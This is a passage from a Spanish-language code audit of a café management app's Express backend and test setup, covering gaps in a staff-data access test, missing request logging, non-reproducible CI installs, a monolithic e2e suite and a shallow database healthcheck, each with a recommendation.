**Problema:** El guardian global economia-guard esta bien y SI se verifica por HTTP (el e2e detectaria que se desconectara el middleware). Pero la comprobacion recorre una lista fija de 7 rutas y solo exige 4. EQUIPO_ALLOWED (auth.js:48-68) incluye cierre-caja, turnos, fichaje, equipo y ausencias, que pueden devolver datos de coste laboral/staff-finance y NO estan en la lista. Una ruta nueva accesible al equipo que filtre dinero no se detecta automaticamente.

**Impacto:** El punto mas sensible del negocio (que el equipo nunca vea dinero) depende de que alguien acuerde anadir cada ruta nueva al test. Un resumen de coste por hora que se cuele en /api/fichaje o /api/turnos pasaria CI en verde.

**Recomendación:** Generar la lista de rutas a comprobar a partir de EQUIPO_ALLOWED (recorrer todos los segmentos permitidos y sus endpoints GET conocidos) en vez de hardcodearla, y subir el minimo. Complementar el test unit de economia-guard (que solo prueba la funcion pura) con la verificacion de que el middleware sigue montado en /api.

### tests.8 · Sin logging de peticiones ni trazabilidad; seeds de arranque con catch vacio

**🟡 MEDIO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Observabilidad

*Ubicación:* `backend/server.js:11-16 y 439-498`

```js
app.use(cors()); app.use(express.json({ limit: "25mb" }));  // sin access log ... .then(() => { try { require("./seed-productos-facturas").aplicar(store); } catch (e) {} }) ... try { require("./sv-timers").init(); } catch (e) {}
```

**Problema:** No hay registro de accesos (ni morgan ni equivalente) ni id de correlacion por peticion; el logging total son ~51 console.* dispersos. Ademas la cadena de seeds del arranque traga todo error con .catch(() => {}) o try{}catch(e){} (hay ~50 catch vacios en el backend), asi que una siembra rota deja datos a medias en silencio.

**Impacto:** Cuando el cafe reporta 'no me guardo el pedido' o 'me da error al cerrar caja', no hay rastro de que peticion fallo ni por que. Un seed que falle al arrancar (precios, escandallos) deja el sistema con datos incompletos sin ninguna senal.

**Recomendación:** Anadir un middleware de access-log (morgan o propio) con metodo/ruta/status/latencia y un request-id; sustituir los catch vacios de los seeds por un log con el nombre del seed y el error.

### tests.9 · CI usa npm install en vez de npm ci: builds no reproducibles pese a existir package-lock.json

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* CI

*Ubicación:* `.github/workflows/ci.yml:21,24`

```js
- name: Instalar dependencias del backend
  run: npm install --prefix backend
- name: Instalar dependencias de test
  run: npm install
```

**Problema:** El CI instala con 'npm install', que puede actualizar el arbol de dependencias y reescribir el lockfile, en vez de 'npm ci', que instala exactamente lo fijado en package-lock.json. El repo tiene package-lock.json, asi que la reproducibilidad esta disponible pero no se usa.

**Impacto:** Dos ejecuciones de CI o CI-vs-local pueden resolver versiones distintas (sobre todo con rangos ^), produciendo el clasico 'en mi maquina pasa': un fallo que solo aparece en un entorno por una version transitiva diferente.

**Recomendación:** Cambiar ambos pasos a 'npm ci' (y 'npm ci --prefix backend'). Garantiza instalaciones deterministas y es mas rapido en CI.

### tests.10 · e2e monolitico y serial con estado compartido: tests acoplados al orden y a un unico dataset

**⚪ BAJO** · estado: abierto · esfuerzo: L · confianza: media

*Área:* Calidad de tests

*Ubicación:* `tests/e2e.spec.js (2075 lineas, 102 tests); playwright.config.js:12`

```js
module.exports = defineConfig({ testDir: "./tests", timeout: 60_000, fullyParallel: false, retries: process.env.CI ? 1 : 0, ... webServer: { command: "node backend/server.js", ... reuseExistingServer: !process.env.CI } });
```

**Problema:** Los 102 tests e2e viven en un solo fichero, corren en serie contra un unico servidor y un unico backend/data compartido. Unos tests crean/borran datos que otros leen, por lo que el resultado depende del orden y del estado acumulado (polucion entre tests). No hay aislamiento por test.

**Impacto:** Flakiness y fallos dificiles de reproducir cuando se anade o reordena un test; la suite completa es lenta (serial, 60s de timeout por test) y un solo fallo temprano puede arrastrar a los siguientes.

**Recomendación:** Trocear e2e.spec.js por area (ventas, cierre-caja, equipo, mbds...), y aislar el estado por test (fixture que resetea backend/data o namespacing de ids por test). Mantener fullyParallel:false solo mientras compartan servidor.

### tests.11 · Healthcheck /api/salud superficial: reporta 'persistente' sin comprobar que la BD responde

**⚪ BAJO** · estado: abierto · esfuerzo: S · confianza: alta

*Área:* Observabilidad

*Ubicación:* `backend/server.js:21-32; backend/db.js:131-133`

```js
const persistente = db.isActive(); res.json({ ... persistencia: persistente ? "persistente" : "efimera", ... });  // db.isActive = () => pool != null
```

**Problema:** El healthcheck (y el que Playwright usa como webServer.url) considera la BD sana con solo 'pool != null' (isActive). Si Postgres se cae despues del arranque, /api/salud sigue diciendo 'persistente' y 200 OK porque nunca hace un ping. El unico SELECT 1 es al conectar, en el boot.

**Impacto:** Un monitor externo o Render veria la app 'sana' con la BD caida; las escrituras fallarian en silencio (ver primer hallazgo) sin que el healthcheck lo refleje.

**Recomendación:** Que /api/salud, cuando db.isActive(), ejecute un 'SELECT 1' con timeout corto y reporte el estado real de la BD (y responda 503 si falla). Exponerlo como liveness vs readiness si se quiere afinar.

---

## Cómo usar este documento

- Las ubicaciones `archivo:línea` permiten localizar cada punto en el repo.
- La **confianza** indica cuán seguro está el revisor; los de confianza *media/baja* conviene verificarlos en el código antes de actuar.
- Prioriza por severidad y por esfuerzo (S=pequeño, M=medio, L=grande).
- Varios hallazgos de la dimensión 1 (IVA de fijos, break-even, motores de food cost) están relacionados: conviene abordarlos juntos con **una sola convención de IVA** y **una sola fuente del margen**.
